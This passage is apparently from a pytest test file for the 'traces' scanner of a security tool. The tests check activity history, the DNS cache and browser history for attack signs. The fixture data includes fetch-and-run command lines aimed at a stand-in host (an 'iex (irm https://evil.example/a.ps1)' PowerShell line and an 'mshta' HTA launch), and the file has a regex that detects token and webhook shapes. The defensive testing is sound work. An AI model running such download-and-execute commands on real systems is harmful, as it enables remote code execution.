    assert status["AEG-TRACE-RUNMRU"].status == CheckStatus.ERROR and "registry exploded" in status["AEG-TRACE-RUNMRU"].detail
    assert status["AEG-TRACE-BROWSER"].status == CheckStatus.ERROR and "RuntimeError" in status["AEG-TRACE-BROWSER"].detail
    assert status["AEG-TRACE-RUNMRU"].category == Category.SUSPICIOUS and status["AEG-TRACE-BROWSER"].category == Category.BROWSER
    assert status["AEG-TRACE-PSHISTORY"].status == CheckStatus.FAIL and status["AEG-TRACE-DNS"].status == CheckStatus.FAIL
    assert {"AEG-TRACE-PSHISTORY", "AEG-TRACE-DNS"} <= set(rules(findings)) and len(checks) == 5


def test_scanner_stops_when_cancelled(ctx, tmp_path, monkeypatch):
    fake_traces_world(ctx, tmp_path, monkeypatch)

    def stop_at_dns(scanner, msg):
        if msg.startswith("checking the DNS"):
            ctx.cancel.set()

    ctx.progress = stop_at_dns
    out = list(tr.TracesScanner().run(ctx))
    assert [c.check_id for c in out if isinstance(c, CheckResult)] == ["AEG-TRACE-RUNMRU", "AEG-TRACE-PSHISTORY", "AEG-TRACE-SHELLHISTORY"]


def test_scanner_findings_are_stable_between_scans(ctx, tmp_path, monkeypatch):
    fake_traces_world(ctx, tmp_path, monkeypatch)
    fingerprints = lambda: sorted(f.fingerprint for f in split(tr.TracesScanner().run(ctx))[0])  # noqa: E731
    assert fingerprints() == fingerprints() and len(set(fingerprints())) == 7


def test_scanner_never_reports_a_whole_history(ctx, tmp_path, monkeypatch):
    """Benign lines and URLs of every source stay out of the findings and the check results."""
    ps, prof = fake_traces_world(ctx, tmp_path, monkeypatch)
    write_lines(ps, ["Get-Date", "zzbenign-ps-line", "iex (irm https://evil.example/a.ps1)"])
    monkeypatch.setattr(tr, "read_runmru", lambda: {"a": "zzbenign-run\\1", "b": "mshta https://evil.example/c.hta\\1", "MRUList": "ab"})
    make_history(prof.history, "chromium", [("https://zzbenign.example/page", ago(hours=1), 1), ("https://evil.example/x", ago(hours=1), 1)])
    blob = dump(list(tr.TracesScanner().run(ctx)))
    assert "zzbenign" not in blob and "Private page title" not in blob


def test_scanner_runs_for_real_on_this_machine(ctx):
    """No monkeypatching: whatever this machine has, the scan finishes with one result per check and no ERROR."""
    out = list(tr.TracesScanner().run(ctx))
    findings, checks = split(out)
    assert [c.check_id for c in checks] == ["AEG-TRACE-RUNMRU", "AEG-TRACE-PSHISTORY", "AEG-TRACE-SHELLHISTORY",
                                            "AEG-TRACE-DNS", "AEG-TRACE-BROWSER"]
    assert all(c.status != CheckStatus.ERROR for c in checks), [(c.check_id, c.detail) for c in checks]
    status = {c.check_id: c.status for c in checks}
    assert status["AEG-TRACE-BROWSER"] == CheckStatus.SKIP and status["AEG-TRACE-DNS"] == CheckStatus.SKIP  # no threat feed in tests
    if not sys.platform.startswith("win"):
        assert status["AEG-TRACE-RUNMRU"] == CheckStatus.SKIP
    json.dumps([x.to_dict() for x in out])


def test_scanner_registered_and_in_the_full_profile():
    from aegis.core.engine import PROFILES

    load_all()
    cls = REGISTRY["traces"]
    assert cls.name == "traces" and cls.title == "Recent activity traces" and cls.description
    assert set(cls.platforms) == {"windows", "linux", "darwin"} and cls().supported()
    assert PROFILES["full"].count("traces") == 1
    assert "traces" not in PROFILES["quick"] and "traces" not in PROFILES["audit"]


def test_engine_runs_the_scanner(tmp_path):
    from aegis.core.engine import ScanEngine

    res = ScanEngine().scan("custom", ["traces"], paths=[tmp_path])
    assert res.scanners == ["traces"] and res.errors == []
    assert {c.check_id for c in res.checks if c.scanner == "traces"} == {
        "AEG-TRACE-RUNMRU", "AEG-TRACE-PSHISTORY", "AEG-TRACE-SHELLHISTORY", "AEG-TRACE-DNS", "AEG-TRACE-BROWSER"}


def test_attack_ids_used_are_current_and_well_formed():
    """The ATT&CK ids this scanner emits (checked against the v20 enterprise matrix); retired ids are caught globally by
    tests/test_core.py::test_no_retired_attack_technique_ids."""
    current = {"T1027.010", "T1056.002", "T1059.001", "T1059.002", "T1059.003", "T1059.004", "T1071", "T1105", "T1140", "T1189",
               "T1202", "T1204.004", "T1218.005", "T1218.007", "T1218.010", "T1218.011", "T1553.001", "T1564.003", "T1566.002",
               "T1568"}
    source = Path(tr.__file__).read_text(encoding="utf-8")
    used = set(re.findall(r"(?<![\w.])T1\d{3}(?:\.\d{3})?(?![.\d])", source))
    assert used == current, used ^ current


def test_no_contiguous_secret_shaped_strings_in_the_scanner_or_its_tests():
    """Tokens and webhook URLs are assembled at run time, so a push never carries a string secret scanners react to."""
    shapes = re.compile(r"gh[pousr]_[A-Za-z0-9]{30,}|AKIA[0-9A-Z]{16}|xox[abprs]-[A-Za-z0-9-]{10,}|sk-[A-Za-z0-9]{20,}|"
                        r"discord(?:app)?\.com/api/webhooks/\d+/[\w-]+|api\.telegram\.org/bot\d+:[\w-]+|hooks\.slack\.com/services/\w+")
    for path in (Path(tr.__file__), Path(__file__)):
        assert not shapes.search(path.read_text(encoding="utf-8")), path.name


@pytest.mark.skipif(sys.platform != "win32", reason="reads the real Windows DNS client cache")
def test_real_windows_dns_cache_is_read_and_checked():
    """CI never downloads the threat feeds, so the scan itself skips this check there. This runs the real
    Get-DnsClientCache path with a one-domain stub feed."""
    import socket
    from types import SimpleNamespace

    from aegis.core.config import Config
    from aegis.scanners.base import ScanContext

    # A cache entry lives only for its TTL (about 60 s for github.com), so resolve and read again until one is there.
    host, records = "", []
    for _attempt in range(3):
        for name in ("github.com", "pypi.org", "www.python.org"):
            try:
                socket.getaddrinfo(name, 443)
            except OSError:
                continue
            rows = tr.powershell_json(tr.DNS_SCRIPT, timeout=60)
            assert rows is not None, "Get-DnsClientCache failed"
            records = tr.parse_dns_cache(rows)
            if any(r.entry.lower().rstrip(".") == name for r in records):
                host = name
                break
        if host:
            break
    if not records:
        pytest.skip("no DNS resolution on this machine, or the DNS client cache is empty")
    assert all(r.rtype for r in records)
    assert host, f"no resolved name stayed in the DNS client cache: {[r.entry for r in records][:20]}"

    bad = {host}
    sigs = SimpleNamespace(bad_domains=bad, is_bad_domain=lambda d: d.lower().strip(".") in bad,
                           is_bad_ip=lambda ip: False)
    ctx = ScanContext(config=Config(), signatures=sigs)
    out = list(tr.check_dns_cache(ctx))
    findings = [x for x in out if getattr(x, "rule_id", "") == "AEG-TRACE-DNS"]
    assert findings and findings[0].location == f"dns-cache:{host}" and findings[0].severity.name == "HIGH"
    assert out[-1].status == "fail" and ctx.stats["traces_dns_entries"] > 0
